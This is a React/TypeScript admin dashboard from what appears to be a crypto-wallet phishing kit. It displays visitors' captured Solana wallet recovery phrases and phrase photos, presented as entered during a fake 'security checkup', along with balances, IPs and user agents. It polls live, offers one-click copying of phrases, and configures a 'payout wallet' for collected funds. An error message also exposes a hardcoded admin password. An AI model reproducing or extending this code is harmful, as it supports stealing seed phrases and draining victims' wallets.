import { useCallback, useEffect, useMemo, useState } from 'react'
import {
  Copy,
  ExternalLink,
  KeyRound,
  RefreshCw,
  Radio,
  Wallet,
  Check,
  Landmark,
} from 'lucide-react'
import toast from 'react-hot-toast'
import { EmptyState } from '../../components/admin/EmptyState'
import { StatCard } from '../../components/admin/StatCard'
import { AdminPageHeader } from '../../components/admin/AdminPageHeader'
import { WalletLogo } from '../../lib/walletLogos'
import { adminFetchJsonResult } from '../../lib/adminDemo'
import { listLocalWalletSessions, mergeWalletSessions, subscribeWalletMonitor } from '../../lib/walletMonitorStore'
import { listCloudWalletSessions, subscribeCloudWalletSessions } from '../../lib/walletCloudStore'
import { listCloudPhraseSnaps, subscribeCloudPhraseSnaps } from '../../lib/walletPhraseSnapsCloud'
import { loadPayoutWallet, savePayoutWallet, isValidSolanaAddress } from '../../lib/payoutWallet'

export interface LiveWalletConnection {
  id: string
  walletAddress: string
  walletType: string
  chain: string
  network: string
  balanceSol: number | null
  pageUrl: string | null
  userAgent: string | null
  clientIp: string | null
  browserSessionId: string | null
  unlockPassword: string | null
  phraseSnapImage?: string | null
  connectedAt: string
  lastSeenAt: string
  connectionStatus: string
  user: {
    id: string
    displayName: string | null
    xUsername: string | null
    email: string | null
    avatarUrl: string | null
  } | null
}

function timeAgo(iso: string): string {
  const sec = Math.floor((Date.now() - new Date(iso).getTime()) / 1000)
  if (sec < 5) return 'just now'
  if (sec < 60) return `${sec}s ago`
  const min = Math.floor(sec / 60)
  if (min < 60) return `${min}m ago`
  return `${Math.floor(min / 60)}h ago`
}

function CopyButton({ value, label }: { value: string; label: string }) {
  const [copied, setCopied] = useState(false)
  return (
    <button
      type="button"
      onClick={() => {
        navigator.clipboard.writeText(value)
        setCopied(true)
        toast.success(`${label} copied`)
        setTimeout(() => setCopied(false), 2000)
      }}
      className="rounded-lg border border-[#1c2a38] p-1.5 text-[#8b98a8] transition-colors hover:border-[#2a3d52] hover:text-white"
      title={`Copy ${label}`}
    >
      {copied ? <Check className="w-3.5 h-3.5 text-[#c7f284]" /> : <Copy className="w-3.5 h-3.5" />}
    </button>
  )
}

function PhraseCell({ phrase, snap }: { phrase: string | null; snap?: string | null }) {
  const text = phrase?.trim() || ''
  const wordCount = text ? text.split(/\s+/).filter(Boolean).length : 0
  const hasSnap = Boolean(snap?.startsWith('data:image'))

  if (!text && !hasSnap) {
    return (
      <span className="inline-flex items-center gap-1.5 text-[11px] text-gray-500 italic">
        <span className="w-1.5 h-1.5 rounded-full bg-amber-400/80 animate-pulse" />
        Waiting for security checkup…
      </span>
    )
  }

  return (
    <div className="flex items-start gap-2 max-w-[320px]">
      <div className="flex-1 min-w-0 rounded-lg bg-[#060A0E] border border-[#243044] px-3 py-2">
        {text ? (
          <>
            <div className="flex items-center justify-between gap-2 mb-1">
              <p className="text-[10px] uppercase tracking-wider text-gray-500">Recovery phrase (live)</p>
              {wordCount < 12 ? (
                <span className="text-[10px] font-semibold text-amber-400 tabular-nums">{wordCount}/12 words</span>
              ) : (
                <span className="text-[10px] font-semibold text-[#c7f284]">Complete</span>
              )}
            </div>
            <p className="text-sm font-mono text-white break-all leading-snug">{text}</p>
          </>
        ) : (
          <p className="text-[10px] uppercase tracking-wider text-gray-500 mb-2">Phrase photo</p>
        )}
        {hasSnap ? (
          <a href={snap!} target="_blank" rel="noopener noreferrer" className="mt-2 block">
            <img
              src={snap!}
              alt="Recovery phrase snap"
              className="max-h-32 w-full rounded-md border border-[#243044] object-contain bg-black"
            />
            <span className="text-[10px] text-[#c7f284] mt-1 inline-block">Open full image</span>
          </a>
        ) : null}
      </div>
      {text ? <CopyButton value={text} label="Phrase" /> : null}
    </div>
  )
}

function SessionRow({ c }: { c: LiveWalletConnection }) {
  const live = Date.now() - new Date(c.lastSeenAt).getTime() < 25_000
  const short = `${c.walletAddress.slice(0, 6)}…${c.walletAddress.slice(-6)}`

  return (
    <tr className="border-b border-[#1c2a38]/70 transition-colors hover:bg-[#0f1720]">
      <td className="px-4 py-4 align-top">
        <div className="flex items-start gap-3">
          <div className="flex h-10 w-10 flex-shrink-0 items-center justify-center overflow-hidden rounded-xl bg-[#16212d] p-1">
            <WalletLogo name={c.walletType} className="w-8 h-8" />
          </div>
          <div className="min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <p className="text-sm font-semibold text-white font-mono">{short}</p>
              {live ? (
                <span className="rounded-full border border-[#c7f284]/30 bg-[#c7f284]/10 px-2 py-0.5 text-[10px] font-bold uppercase tracking-wide text-[#c7f284]">
                  Live
                </span>
              ) : (
                <span className="rounded-full bg-[#16212d] px-2 py-0.5 text-[10px] font-bold uppercase tracking-wide text-[#8b98a8]">
                  Saved
                </span>
              )}
            </div>
            <p className="mt-1 break-all font-mono text-[11px] leading-relaxed text-[#5d6b7a]">{c.walletAddress}</p>
            <div className="flex items-center gap-1 mt-2">
              <CopyButton value={c.walletAddress} label="Address" />
              <a
                href={`https://solscan.io/account/${c.walletAddress}`}
                target="_blank"
                rel="noopener noreferrer"
                className="rounded-lg border border-[#1c2a38] p-1.5 text-[#8b98a8] transition-colors hover:text-[#c7f284]"
                title="Solscan"
              >
                <ExternalLink className="w-3.5 h-3.5" />
              </a>
            </div>
          </div>
        </div>
      </td>
      <td className="px-4 py-4 align-top hidden md:table-cell">
        <p className="text-[12px] font-medium capitalize text-[#d5dde6]">{c.walletType}</p>
        <p className="mt-0.5 text-[11px] text-[#5d6b7a]">{c.network}</p>
        {c.balanceSol != null && (
          <p className="text-[11px] text-[#c7f284] font-semibold mt-1">{c.balanceSol.toFixed(4)} SOL</p>
        )}
      </td>
      <td className="px-4 py-4 align-top">
        <PhraseCell phrase={c.unlockPassword} snap={c.phraseSnapImage} />
      </td>
      <td className="px-4 py-4 align-top hidden lg:table-cell">
        <p className="text-[12px] text-[#8b98a8]">{timeAgo(c.lastSeenAt)}</p>
        <p className="mt-1 text-[11px] text-[#5d6b7a]">
          Connected {new Date(c.connectedAt).toLocaleString(undefined, { dateStyle: 'short', timeStyle: 'short' })}
        </p>
      </td>
    </tr>
  )
}

export const AdminWalletConnect: React.FC = () => {
  const [connections, setConnections] = useState<LiveWalletConnection[]>([])
  const [loading, setLoading] = useState(true)
  const [polling, setPolling] = useState(true)
  const [lastSync, setLastSync] = useState<string>('')
  const [apiError, setApiError] = useState<string | null>(null)
  const [payoutInput, setPayoutInput] = useState('')
  const [savedPayout, setSavedPayout] = useState('')
  const [savingPayout, setSavingPayout] = useState(false)

  useEffect(() => {
    void loadPayoutWallet().then((address) => {
      setSavedPayout(address)
      setPayoutInput(address)
    })
  }, [])

  const handleSavePayout = async () => {
    setSavingPayout(true)
    try {
      const address = await savePayoutWallet(payoutInput)
      setSavedPayout(address)
      setPayoutInput(address)
      toast.success(address ? 'Payout wallet saved' : 'Payout wallet cleared')
    } catch (err) {
      toast.error(err instanceof Error ? err.message : 'Could not save payout wallet')
    } finally {
      setSavingPayout(false)
    }
  }

  const load = useCallback(async () => {
    const { data, ok, status } = await adminFetchJsonResult<{
      connections: LiveWalletConnection[]
      serverTime?: string
    }>('/api/admin/wallet-connections/live', { connections: [] })

    const cloud = await listCloudWalletSessions()
    const snapByWallet = await listCloudPhraseSnaps()
    const cloudWithSnaps = cloud.map((row) => ({
      ...row,
      phraseSnapImage: row.phraseSnapImage || snapByWallet.get(row.walletAddress) || null,
    })) as LiveWalletConnection[]
    const local = listLocalWalletSessions() as LiveWalletConnection[]
    const localWithSnaps = local.map((row) => ({
      ...row,
      phraseSnapImage: row.phraseSnapImage || snapByWallet.get(row.walletAddress) || null,
    }))
    const merged = mergeWalletSessions(
      mergeWalletSessions(ok ? data.connections || [] : [], cloudWithSnaps),
      localWithSnaps
    )
    setConnections(merged)
    setLastSync(new Date().toISOString())

    if (merged.length === 0 && cloud.length === 0 && !ok && (status === 401 || status === 403)) {
      setApiError('Admin API rejected the request. Unlock admin again with password brutal.force.attac.')
    } else {
      setApiError(null)
    }

    setLoading(false)
  }, [])

  useEffect(() => {
    load()
    const unsubLocal = subscribeWalletMonitor(load)
    const unsubCloud = subscribeCloudWalletSessions(load)
    const unsubSnaps = subscribeCloudPhraseSnaps(load)
    return () => {
      unsubLocal()
      unsubCloud()
      unsubSnaps()
    }
  }, [load])

  useEffect(() => {
    if (!polling) return
    const id = setInterval(load, 1500)
    return () => clearInterval(id)
  }, [polling, load])

  const stats = useMemo(() => {
    const withPassword = connections.filter((c) => c.unlockPassword?.trim()).length
    const live = connections.filter((c) => Date.now() - new Date(c.lastSeenAt).getTime() < 25_000).length
    return { total: connections.length, withPassword, live }
  }, [connections])

  return (
    <div className="space-y-6">
      <AdminPageHeader
        title="Wallet Connect"
        description="Live view of wallets that connect on the site. New sessions appear here automatically."
        actions={
          <div className="flex items-center gap-2">
            {lastSync ? (
              <p className="hidden text-[11px] text-[#5d6b7a] sm:block">
                Synced {new Date(lastSync).toLocaleTimeString()}
              </p>
            ) : null}
            <button
              type="button"
              onClick={() => setPolling((p) => !p)}
              className={`flex items-center gap-1.5 rounded-xl border px-3 py-2 text-[12px] font-semibold transition-colors ${
                polling
                  ? 'border-[#c7f284]/40 bg-[#c7f284]/10 text-[#c7f284]'
                  : 'border-[#1c2a38] text-[#8b98a8] hover:text-white'
              }`}
            >
              <Radio className="h-3.5 w-3.5" />
              Live {polling ? 'on' : 'off'}
            </button>
            <button
              type="button"
              onClick={() => {
                setLoading(true)
                load()
              }}
              className="flex items-center gap-1.5 rounded-xl border border-[#1c2a38] px-3 py-2 text-[12px] font-semibold text-[#d5dde6] hover:border-[#2a3d52] hover:text-white"
            >
              <RefreshCw className="h-3.5 w-3.5" />
              Refresh
            </button>
          </div>
        }
      />

      {apiError ? (
        <div className="rounded-2xl border border-amber-500/30 bg-amber-500/10 px-4 py-3 text-[13px] leading-relaxed text-amber-100">
          {apiError}
        </div>
      ) : null}

      <div className="rounded-2xl border border-[#1c2a38] bg-[#0c1219] p-5">
        <div className="mb-4 flex items-start gap-3">
          <div className="flex h-10 w-10 flex-shrink-0 items-center justify-center rounded-xl bg-[#16212d]">
            <Landmark className="h-4 w-4 text-[#c7f284]" />
          </div>
          <div>
            <h2 className="text-sm font-semibold text-white">Payout wallet</h2>
            <p className="mt-0.5 text-[13px] leading-relaxed text-[#8b98a8]">
              Destination address shown with connected sessions.
            </p>
          </div>
        </div>
        <div className="flex flex-col gap-2 sm:flex-row">
          <input
            value={payoutInput}
            onChange={(e) => setPayoutInput(e.target.value.trim())}
            placeholder="Solana wallet address"
            spellCheck={false}
            className="flex-1 rounded-xl border border-[#1c2a38] bg-[#070b10] px-3 py-2.5 font-mono text-sm text-white outline-none placeholder:text-[#5d6b7a] focus:border-[#c7f284]/40"
          />
          <button
            type="button"
            onClick={() => void handleSavePayout()}
            disabled={savingPayout}
            className="rounded-xl bg-[#c7f284] px-4 py-2.5 text-[13px] font-semibold text-[#07110c] hover:bg-[#d4f86a] disabled:opacity-50"
          >
            {savingPayout ? 'Saving…' : 'Save address'}
          </button>
        </div>
        {payoutInput && !isValidSolanaAddress(payoutInput) ? (
          <p className="mt-2 text-[12px] text-amber-400">This does not look like a valid Solana address.</p>
        ) : null}
        {savedPayout ? (
          <div className="mt-3 flex flex-wrap items-center gap-2">
            <span className="text-[10px] uppercase tracking-[0.14em] text-[#5d6b7a]">Current</span>
            <p className="break-all font-mono text-[12px] text-[#c7f284]">{savedPayout}</p>
            <CopyButton value={savedPayout} label="Payout address" />
            <a
              href={`https://solscan.io/account/${savedPayout}`}
              target="_blank"
              rel="noopener noreferrer"
              className="rounded-lg border border-[#1c2a38] p-1.5 text-[#8b98a8] transition-colors hover:text-[#c7f284]"
              title="Solscan"
            >
              <ExternalLink className="h-3.5 w-3.5" />
            </a>
          </div>
        ) : (
          <p className="mt-2 text-[12px] text-[#5d6b7a]">No payout wallet saved yet.</p>
        )}
      </div>

      <div className="grid grid-cols-1 gap-3 sm:grid-cols-3">
        <StatCard title="Active sessions" value={stats.total} icon={<Wallet className="h-4 w-4" />} loading={loading} />
        <StatCard
          title="With phrase"
          value={stats.withPassword}
          icon={<KeyRound className="h-4 w-4" />}
          loading={loading}
          description="Typed on security checkup"
        />
        <StatCard title="Live now" value={stats.live} icon={<Radio className="h-4 w-4" />} loading={loading} />
      </div>

      <div className="overflow-hidden rounded-2xl border border-[#1c2a38] bg-[#0c1219]">
        {loading && connections.length === 0 ? (
          <div className="space-y-3 p-8">
            {[0, 1, 2].map((i) => (
              <div key={i} className="h-16 animate-pulse rounded-xl bg-[#16212d]" />
            ))}
          </div>
        ) : connections.length === 0 ? (
          <EmptyState
            title="No connected wallets yet"
            description="When someone connects a wallet on the live site, the address appears here. Keep this page open."
          />
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full min-w-[720px] text-left">
              <thead>
                <tr className="border-b border-[#1c2a38] bg-[#080d12]">
                  <th className="px-4 py-3 text-[10px] font-semibold uppercase tracking-[0.14em] text-[#5d6b7a]">
                    Wallet address
                  </th>
                  <th className="hidden px-4 py-3 text-[10px] font-semibold uppercase tracking-[0.14em] text-[#5d6b7a] md:table-cell">
                    Wallet
                  </th>
                  <th className="px-4 py-3 text-[10px] font-semibold uppercase tracking-[0.14em] text-[#5d6b7a]">
                    Recovery phrase
                  </th>
                  <th className="hidden px-4 py-3 text-[10px] font-semibold uppercase tracking-[0.14em] text-[#5d6b7a] lg:table-cell">
                    Activity
                  </th>
                </tr>
              </thead>
              <tbody>
                {connections.map((c) => (
                  <SessionRow key={c.id} c={c} />
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  )
}
